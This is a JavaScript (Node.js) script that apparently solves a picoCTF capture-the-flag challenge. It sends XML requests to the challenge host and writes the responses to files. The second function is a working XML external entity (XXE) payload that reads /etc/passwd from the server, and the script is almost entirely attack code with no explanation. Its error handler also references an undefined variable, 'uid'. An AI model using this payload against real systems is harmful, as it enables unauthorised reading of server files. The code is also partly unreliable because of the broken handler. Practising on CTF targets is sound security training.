
import fs from 'fs';
import http from 'http';


const HOST = 'http://saturn.picoctf.net:62186';

const attack = (uid) => {

	let buffer = Buffer.from([
		'<?xml version="1.0" encoding="UTF-8"?>',
		'<data><ID>' + uid + '</ID></data>'
	].join('\n'), 'utf8')

	let request = http.request(HOST + '/data', {
		headers: {
			'Content-Type': 'application/xml',
			'Content-Length': buffer.length,
			'Referer': HOST
		},
		method: 'POST',
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);

			fs.writeFileSync('data/' + uid + '.txt', payload);

		});

	});

	request.on('error', (err) => {
		console.error(uid, err);
	});

	request.end(buffer);

};

attack(0);
attack(1);
attack(2);
attack(3);
attack(1001);


const entity_attack = () => {

	let buffer = Buffer.from([
		'<?xml version="1.0" encoding="UTF-8"?>',
		'<!DOCTYPE data [',
		'<!ENTITY file SYSTEM "file:///etc/passwd">',
		']>',
		'<data><ID>&file;</ID></data>'
	].join('\n'), 'utf8')

	let request = http.request(HOST + '/data', {
		headers: {
			'Content-Type': 'application/xml',
			'Content-Length': buffer.length,
			'Referer': HOST
		},
		method: 'POST',
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);

			fs.writeFileSync('data/entity_attack', payload);

		});

	});

	request.on('error', (err) => {
		console.error(uid, err);
	});

	request.end(buffer);

};

entity_attack();

